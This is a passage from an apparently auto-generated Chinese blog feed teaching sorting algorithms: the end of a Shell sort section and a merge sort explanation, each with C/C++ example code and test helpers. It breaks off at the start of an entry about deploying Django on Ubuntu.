假设在数列中存在a[i]=a[j]，若在排序之前，a[i]在a[j]前面；并且排序之后，a[i]仍然在a[j]前面。则这个排序算法是稳定的！</p><h3 id="代码演示-3"><a href="#代码演示-3" class="headerlink" title="代码演示"></a>代码演示</h3><p><strong>希尔排序的关键并不是随便分组后各自排序，而是将相隔某个“增量”的记录组成一个字序列，实现跳跃式的移动，使得排序的效率提高</strong>。这的“增量”选取就非常关键了。我们采用的是increase/2的方式选取。可究竟选取一个什么样的值，最好呢？目前还是数学难题 /</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line">#define _CRT_SECURE_NO_WARNINGS  </span><br><span class="line">#include &lt;stdio.h&gt;  </span><br><span class="line">#include &lt;stdlib.h&gt;  </span><br><span class="line">#include &lt;time.h&gt;  </span><br><span class="line">#include &lt;sys&#x2F;timeb.h&gt;  </span><br><span class="line">#define MAXSIZE 10  </span><br><span class="line">&#x2F;&#x2F;交换值  </span><br><span class="line">void Swap(int* a, int* b)  </span><br><span class="line">&#123;  </span><br><span class="line">    int temp &#x3D; *a;  </span><br><span class="line">    *a &#x3D; *b;  </span><br><span class="line">    *b &#x3D; temp;  </span><br><span class="line">&#125;  </span><br><span class="line">&#x2F;&#x2F;直接插入排序 升序  </span><br><span class="line">void InsertSort_Up(int* arr, int length)  </span><br><span class="line">&#123;  </span><br><span class="line">    &#x2F;&#x2F;假定第0个元素是有序表，从第1个元素开始往有序表中插入数据  </span><br><span class="line">    for (int i &#x3D; 1; i &lt; length; i++)  </span><br><span class="line">    &#123;  </span><br><span class="line">        int temp &#x3D; arr[i];  </span><br><span class="line">        int j;  </span><br><span class="line">        for (j &#x3D; i - 1; j &gt;&#x3D; 0 &amp;&amp; arr[j] &gt; temp; j--)  </span><br><span class="line">        &#123;  </span><br><span class="line">            arr[j + 1] &#x3D; arr[j];&#x2F;&#x2F;往前挪  </span><br><span class="line">        &#125;  </span><br><span class="line">        arr[j + 1] &#x3D; temp;  </span><br><span class="line">    &#125;  </span><br><span class="line">    return;  </span><br><span class="line">&#125;  </span><br><span class="line">&#x2F;&#x2F;希尔排序 降序  </span><br><span class="line">&#x2F;&#x2F;根据插入排序的原理，将原来的一个大组，采用间隔的形式分成很多小组，分别进行插入排序  </span><br><span class="line">&#x2F;&#x2F;每一轮结束后 继续分成更小的组进行 插入排序，直到分成的小组长度为1，说明插入排序完毕  </span><br><span class="line">void ShellSort_Up(int* arr,int length)  </span><br><span class="line">&#123;  </span><br><span class="line">    int increase &#x3D; length;  </span><br><span class="line">    int i, j, k, temp;  </span><br><span class="line">    do  </span><br><span class="line">    &#123;  </span><br><span class="line">        increase &#x3D; increase &#x2F; 2;&#x2F;&#x2F;每个小组的长度  </span><br><span class="line">        &#x2F;&#x2F;每个小组的第0个元素  </span><br><span class="line">        for (i &#x3D; 0; i &lt; increase; i++)  </span><br><span class="line">        &#123;  </span><br><span class="line">            &#x2F;&#x2F;对每个小组进行插入排序，因为是间隔的形式分组，每个小组下一个元素为 j+&#x3D;increse  </span><br><span class="line">            for (j &#x3D; i + increase; j &lt; length; j +&#x3D; increase)  </span><br><span class="line">            &#123;  </span><br><span class="line">                temp &#x3D; arr[j];&#x2F;&#x2F;待插入元素  </span><br><span class="line">                  </span><br><span class="line">                for (k &#x3D; j - increase; k &gt;&#x3D; 0 &amp;&amp; temp &lt; arr[k]; k -&#x3D; increase)  </span><br><span class="line">                &#123;  </span><br><span class="line">                    arr[k + increase] &#x3D; arr[k];  </span><br><span class="line">                &#125;  </span><br><span class="line">                arr[k + increase] &#x3D; temp;  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125; while (increase&gt;&#x3D;1);  </span><br><span class="line">&#125;  </span><br><span class="line">&#x2F;&#x2F;希尔排序 升序  </span><br><span class="line">void ShellSort_Down(int* arr, int length)  </span><br><span class="line">&#123;  </span><br><span class="line">    int increase &#x3D; length;  </span><br><span class="line">    int i, j, k, temp;  </span><br><span class="line">    do  </span><br><span class="line">    &#123;  </span><br><span class="line">        increase &#x3D; increase &#x2F; 2;&#x2F;&#x2F;每个小组的长度  </span><br><span class="line">                                    &#x2F;&#x2F;每个小组的第0个元素  </span><br><span class="line">        for (i &#x3D; 0; i &lt; increase; i++)  </span><br><span class="line">        &#123;  </span><br><span class="line">            &#x2F;&#x2F;对每个小组进行插入排序，因为是间隔的形式分组，每个小组下一个元素为 j+&#x3D;increse  </span><br><span class="line">            for (j &#x3D; i + increase; j &lt; length; j +&#x3D; increase)  </span><br><span class="line">            &#123;  </span><br><span class="line">                temp &#x3D; arr[j];&#x2F;&#x2F;待插入元素  </span><br><span class="line">  </span><br><span class="line">                for (k &#x3D; j - increase; k &gt;&#x3D; 0 &amp;&amp; temp &gt; arr[k]; k -&#x3D; increase)  </span><br><span class="line">                &#123;  </span><br><span class="line">                    arr[k + increase] &#x3D; arr[k];  </span><br><span class="line">                &#125;  </span><br><span class="line">                arr[k + increase] &#x3D; temp;  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125; while (increase&gt;&#x3D;1);  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">&#x2F;&#x2F;打印数组元素  </span><br><span class="line">void PrintArr(int* arr, int length)  </span><br><span class="line">&#123;  </span><br><span class="line">    for (int i &#x3D; 0; i &lt; length; i++)  </span><br><span class="line">    &#123;  </span><br><span class="line">        printf(&quot;%d &quot;, arr[i]);  </span><br><span class="line">    &#125;  </span><br><span class="line">    printf(&quot;\n&quot;);  </span><br><span class="line">    return;  </span><br><span class="line">&#125;  </span><br><span class="line">long GetSysTime()  </span><br><span class="line">&#123;  </span><br><span class="line">    struct timeb tb;  </span><br><span class="line">    ftime(&amp;tb);  </span><br><span class="line">    return tb.time * 1000 + tb.millitm;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">int main(int argc, char *argv[])  </span><br><span class="line">&#123;  </span><br><span class="line">    srand((size_t)time(NULL));&#x2F;&#x2F;设置随机种子  </span><br><span class="line">    int arr[MAXSIZE] &#x3D; &#123; 0 &#125;;  </span><br><span class="line">    int arr2[MAXSIZE] &#x3D; &#123; 0 &#125;;  </span><br><span class="line">    &#x2F;&#x2F;给每个元素设置一个随机值  </span><br><span class="line">    for (int i &#x3D; 0; i &lt; MAXSIZE; i++)  </span><br><span class="line">    &#123;  </span><br><span class="line">        int num &#x3D; rand() % MAXSIZE;  </span><br><span class="line">        arr[i] &#x3D; num;  </span><br><span class="line">        arr2[i] &#x3D; num;  </span><br><span class="line">    &#125;  </span><br><span class="line">    printf(&quot;排序前:\n&quot;);  </span><br><span class="line">    PrintArr(arr, MAXSIZE);  </span><br><span class="line">    printf(&quot;希尔排序升序:\n&quot;);  </span><br><span class="line">    ShellSort_Up(arr, MAXSIZE);  </span><br><span class="line">    PrintArr(arr, MAXSIZE);  </span><br><span class="line">    printf(&quot;希尔排序降序:\n&quot;);  </span><br><span class="line">    ShellSort_Down(arr, MAXSIZE);  </span><br><span class="line">    PrintArr(arr, MAXSIZE);  </span><br><span class="line">  </span><br><span class="line">    &#x2F;*long start1 &#x3D; GetSysTime();  </span><br><span class="line">    InsertSort_Up(arr, MAXSIZE);  </span><br><span class="line">    long end1 &#x3D; GetSysTime();  </span><br><span class="line">    long start2 &#x3D; GetSysTime();  </span><br><span class="line">    ShellSort_Up(arr2, MAXSIZE);  </span><br><span class="line">    long end2 &#x3D; GetSysTime();  </span><br><span class="line">    printf(&quot;直接排序%d个数据 耗费时间%d毫秒\n&quot;, MAXSIZE, end1 - start1);  </span><br><span class="line">    printf(&quot;希尔排序%d个数据 耗费时间%d毫秒\n&quot;, MAXSIZE, end2 - start2);  *&#x2F;</span><br><span class="line">    return 0;  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><center><p><img src="/2018/05/24/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%A7%E7%BB%BC%E5%90%881/%E5%B8%8C%E5%B0%94%E6%8E%92%E5%BA%8F%E7%BB%93%E6%9E%9C.png"></p></center><h1 id="高级排序问题"><a href="#高级排序问题" class="headerlink" title="高级排序问题"></a><center>高级排序问题</center></h1><p>前面我们讨论的是O（n^2）的算法，现在我们讨论O（nlogn）的算法</p><center>**nlogn比n^2快多少呢？**</center><center><p><img src="/2018/05/24/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%A7%E7%BB%BC%E5%90%881/%E6%AF%94%E8%BE%833.png"></p></center><h2 id="归并排序（Merge-Sort）"><a href="#归并排序（Merge-Sort）" class="headerlink" title="归并排序（Merge Sort）"></a>归并排序（Merge Sort）</h2><h3 id="算法思想-4"><a href="#算法思想-4" class="headerlink" title="算法思想"></a>算法思想</h3><p>算法思想是：归并排序是建立在<code>归并</code>操作上的一种有效的排序算法。该算法是采用<code>分治法</code>（Divide and  Conquer）的一个非常典型的应用。将已有序的子序列合并，得到完全有序的序列；即先使每个子序列有序，再使子序列段间有序。若将两个有序表合并成一个有序表，称为2-路归并。  </p><blockquote><p><strong>分治法:**将问题</strong>分**(divide)成一些小的问题然后递归求解，而**治(conquer)**的阶段则将分的阶段得到的各答案”修补”在一起，即分而治之 </p></blockquote><h3 id="算法描述-1"><a href="#算法描述-1" class="headerlink" title="算法描述"></a>算法描述</h3><p>**1.**把长度为n的输入序列分成两个长度为n/2的子序列；</p><p>**2.**对这两个子序列分别使用归并排序；</p><p>**3.**将两个排序好的子序列合并成一个最终的排序序列</p><h3 id="动态演示-4"><a href="#动态演示-4" class="headerlink" title="动态演示"></a>动态演示</h3><center><p><img src="/2018/05/24/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%A7%E7%BB%BC%E5%90%881/%E5%BD%92%E5%B9%B6%E6%8E%92%E5%BA%8F.gif"></p><p><img src="/2018/05/24/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%A7%E7%BB%BC%E5%90%881/%E5%BD%92%E5%B9%B62.png"></p></center><blockquote><p>ps:二图来自某个博客图</p><p>可以看到这种结构很像一棵完全二叉树，本文的归并排序我们采用<code>递归</code>去实现（也可采用<code>迭代</code>的方式去实现）。<strong>分</strong>阶段可以理解为就是递归拆分子序列的过程，递归深度为<code>log2n</code>。 </p></blockquote><p>从二图中可以看到，一共有3个层级，每次分组都是除以2，于是log8=3.<strong>如果元素的个数不是  X^2的时候，我们<code>log（N）</code>的时候向上取整就可以了.</strong> </p><p>每一层我们处理的元素个数是一样的，虽然我们把它分成了不同的部分，每个层级归并过程我们用<code>O(N)</code>复杂度来处理的话，那么就是一个<code>Nlog(N)</code>级别的算法. </p><br><center>**合并相邻有序子序列</center>**<p>再来看看<code>治</code>阶段，我们需要将两个已经有序的子序列合并成一个有序序列，比如上图中的最后一次合并，要将[4,5,7,8]和[1,2,3,6]两个已经有序的子序列，合并为最终序列[1,2,3,4,5,6,7,8]，来看下实现步骤。 </p><blockquote><p><strong>开辟一个同样大小的临时空间</strong> </p><p>使用<strong>三个索引</strong>，分别是下图中的<strong>i，j，temp</strong></p></blockquote><center><p><img src="/2018/05/24/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%A7%E7%BB%BC%E5%90%881/%E5%BD%92%E5%B9%B63.png"></p></center><h3 id="代码演示-4"><a href="#代码演示-4" class="headerlink" title="代码演示"></a>代码演示</h3><p><code>main.cpp</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &quot;SortTestHelper.h&quot;</span><br><span class="line">#include &quot;InsertionSort.h&quot;</span><br><span class="line"></span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 将arr[l...mid]和arr[mid+1...r]两部分进行归并</span><br><span class="line">template&lt;typename  T&gt;</span><br><span class="line">void __merge(T arr[], int l, int mid, int r) &#123;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 经测试,传递aux数组的性能效果并不好</span><br><span class="line">    T aux[r - l + 1];</span><br><span class="line">    for (int i &#x3D; l; i &lt;&#x3D; r; i++)</span><br><span class="line">        aux[i - l] &#x3D; arr[i];</span><br><span class="line"> </span><br><span class="line">    int i &#x3D; l, j &#x3D; mid + 1;</span><br><span class="line">    for (int k &#x3D; l; k &lt;&#x3D; r; k++) &#123;</span><br><span class="line">        &#x2F;&#x2F; 注意数组越界情况</span><br><span class="line">        if (i &gt; mid) &#123;</span><br><span class="line">             arr[k] &#x3D; aux[j - l]; j++; </span><br><span class="line">        &#125;</span><br><span class="line">        else if (j &gt; r) &#123;</span><br><span class="line">             arr[k] &#x3D; aux[i - l]; i++; </span><br><span class="line">        &#125;</span><br><span class="line">        else if (aux[i - l] &lt; aux[j - l]) &#123; </span><br><span class="line">            arr[k] &#x3D; aux[i - l]; i++; </span><br><span class="line">        &#125;</span><br><span class="line">        else &#123; </span><br><span class="line">            arr[k] &#x3D; aux[j - l]; j++; </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 递归使用归并排序,对arr[l...r]的范围进行排序</span><br><span class="line">template&lt;typename T&gt;</span><br><span class="line">void __mergeSort(T arr[], int l, int r) &#123;</span><br><span class="line"></span><br><span class="line">    if (l &gt;&#x3D; r)</span><br><span class="line">        return;</span><br><span class="line"></span><br><span class="line">    int mid &#x3D; (l + r) &#x2F; 2;</span><br><span class="line">    __mergeSort(arr, l, mid);</span><br><span class="line">    __mergeSort(arr, mid + 1, r);</span><br><span class="line">    __merge(arr, l, mid, r);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">template&lt;typename T&gt;</span><br><span class="line">void mergeSort(T arr[], int n) &#123;</span><br><span class="line"></span><br><span class="line">    __mergeSort(arr, 0, n - 1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line"></span><br><span class="line">    int n &#x3D; 50000;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 测试1 一般性测试</span><br><span class="line">    cout &lt;&lt; &quot;Test for Random Array, size &#x3D; &quot; &lt;&lt; n &lt;&lt; &quot;, random range [0, &quot; &lt;&lt; n &lt;&lt; &quot;]&quot; &lt;&lt; endl;</span><br><span class="line">    int* arr1 &#x3D; SortTestHelper::generateRandomArray(n, 0, n);</span><br><span class="line">    int* arr2 &#x3D; SortTestHelper::copyIntArray(arr1, n);</span><br><span class="line"></span><br><span class="line">    SortTestHelper::testSort(&quot;Insertion Sort&quot;, insertionSort, arr1, n);</span><br><span class="line">    SortTestHelper::testSort(&quot;Merge Sort&quot;, mergeSort, arr2, n);</span><br><span class="line"></span><br><span class="line">    delete[] arr1;</span><br><span class="line">    delete[] arr2;</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 测试2 测试近乎有序的数组</span><br><span class="line">    int swapTimes &#x3D; 100;</span><br><span class="line">    cout &lt;&lt; &quot;Test for Random Nearly Ordered Array, size &#x3D; &quot; &lt;&lt; n &lt;&lt; &quot;, swap time &#x3D; &quot; &lt;&lt; swapTimes &lt;&lt; endl;</span><br><span class="line">    arr1 &#x3D; SortTestHelper::generateNearlyOrderedArray(n, swapTimes);</span><br><span class="line">    arr2 &#x3D; SortTestHelper::copyIntArray(arr1, n);</span><br><span class="line"></span><br><span class="line">    SortTestHelper::testSort(&quot;Insertion Sort&quot;, insertionSort, arr1, n);</span><br><span class="line">    SortTestHelper::testSort(&quot;Merge Sort&quot;, mergeSort, arr2, n);</span><br><span class="line"></span><br><span class="line">    delete(arr1);</span><br><span class="line">    delete(arr2);</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>InsertionSort.h</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">#ifndef INC_02_MERGE_SORT_INSERTIONSORT_H</span><br><span class="line">#define INC_02_MERGE_SORT_INSERTIONSORT_H</span><br><span class="line"></span><br><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &lt;algorithm&gt;</span><br><span class="line"></span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">template&lt;typename T&gt;</span><br><span class="line">void insertionSort(T arr[], int n) &#123;</span><br><span class="line"></span><br><span class="line">    for (int i &#x3D; 1; i &lt; n; i++) &#123;</span><br><span class="line"></span><br><span class="line">        T e &#x3D; arr[i];</span><br><span class="line">        int j;</span><br><span class="line">        for (j &#x3D; i; j &gt; 0 &amp;&amp; arr[j - 1] &gt; e; j--)</span><br><span class="line">            arr[j] &#x3D; arr[j - 1];</span><br><span class="line">        arr[j] &#x3D; e;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 对arr[l...r]范围的数组进行插入排序</span><br><span class="line">template&lt;typename T&gt;</span><br><span class="line">void insertionSort(T arr[], int l, int r) &#123;</span><br><span class="line"></span><br><span class="line">    for (int i &#x3D; l + 1; i &lt;&#x3D; r; i++) &#123;</span><br><span class="line"></span><br><span class="line">        T e &#x3D; arr[i];</span><br><span class="line">        int j;</span><br><span class="line">        for (j &#x3D; i; j &gt; l &amp;&amp; arr[j - 1] &gt; e; j--)</span><br><span class="line">            arr[j] &#x3D; arr[j - 1];</span><br><span class="line">        arr[j] &#x3D; e;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#endif &#x2F;&#x2F;INC_02_MERGE_SORT_INSERTIONSORT_H</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>SortTestHelper.h</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">#ifndef INC_02_MERGE_SORT_SORTTESTHELPER_H</span><br><span class="line">#define INC_02_MERGE_SORT_SORTTESTHELPER_H</span><br><span class="line"></span><br><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &lt;algorithm&gt;</span><br><span class="line">#include &lt;string&gt;</span><br><span class="line">#include &lt;ctime&gt;</span><br><span class="line">#include &lt;cassert&gt;</span><br><span class="line"></span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">namespace SortTestHelper &#123;</span><br><span class="line"></span><br><span class="line">    int *generateRandomArray(int n, int range_l, int range_r) &#123;</span><br><span class="line"></span><br><span class="line">        int *arr &#x3D; new int[n];</span><br><span class="line"></span><br><span class="line">        srand(time(NULL));</span><br><span class="line">        for (int i &#x3D; 0; i &lt; n; i++)</span><br><span class="line">            arr[i] &#x3D; rand() % (range_r - range_l + 1) + range_l;</span><br><span class="line">        return arr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    int *generateNearlyOrderedArray(int n, int swapTimes) &#123;</span><br><span class="line"></span><br><span class="line">        int *arr &#x3D; new int[n];</span><br><span class="line">        for (int i &#x3D; 0; i &lt; n; i++)</span><br><span class="line">            arr[i] &#x3D; i;</span><br><span class="line"></span><br><span class="line">        srand(time(NULL));</span><br><span class="line">        for (int i &#x3D; 0; i &lt; swapTimes; i++) &#123;</span><br><span class="line">            int posx &#x3D; rand() % n;</span><br><span class="line">            int posy &#x3D; rand() % n;</span><br><span class="line">            swap(arr[posx], arr[posy]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return arr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    int *copyIntArray(int a[], int n) &#123;</span><br><span class="line"></span><br><span class="line">        int *arr &#x3D; new int[n];</span><br><span class="line">        copy(a, a + n, arr);</span><br><span class="line">        return arr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    template&lt;typename T&gt;</span><br><span class="line">    void printArray(T arr[], int n) &#123;</span><br><span class="line"></span><br><span class="line">        for (int i &#x3D; 0; i &lt; n; i++)</span><br><span class="line">            cout &lt;&lt; arr[i] &lt;&lt; &quot; &quot;;</span><br><span class="line">        cout &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    template&lt;typename T&gt;</span><br><span class="line">    bool isSorted(T arr[], int n) &#123;</span><br><span class="line"></span><br><span class="line">        for (int i &#x3D; 0; i &lt; n - 1; i++)</span><br><span class="line">            if (arr[i] &gt; arr[i + 1])</span><br><span class="line">                return false;</span><br><span class="line"></span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    template&lt;typename T&gt;</span><br><span class="line">    void testSort(const string &amp;sortName, void(*sort)(T[], int), T arr[], int n) &#123;</span><br><span class="line"></span><br><span class="line">        clock_t startTime &#x3D; clock();</span><br><span class="line">        sort(arr, n);</span><br><span class="line">        clock_t endTime &#x3D; clock();</span><br><span class="line">        cout &lt;&lt; sortName &lt;&lt; &quot; : &quot; &lt;&lt; double(endTime - startTime) &#x2F; CLOCKS_PER_SEC &lt;&lt; &quot; s&quot; &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">        assert(isSorted(arr, n));</span><br><span class="line"></span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">#endif &#x2F;&#x2F;INC_02_MERGE_SORT_SORTTESTHELPER_H</span><br></pre></td></tr></table></figure><h3 id="优化性能"><a href="#优化性能" class="headerlink" title="优化性能"></a>优化性能</h3><center>**==优化一==**</center>]]></content>
      
      
      <categories>
          
          <category> 数据结构 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据结构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Django项目部署在ubuntu服务器上</title>
      <link href="/2018/05/18/Django%E9%A1%B9%E7%9B%AE%E9%83%A8%E7%BD%B2%E5%9C%A8ubuntu%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A/"/>
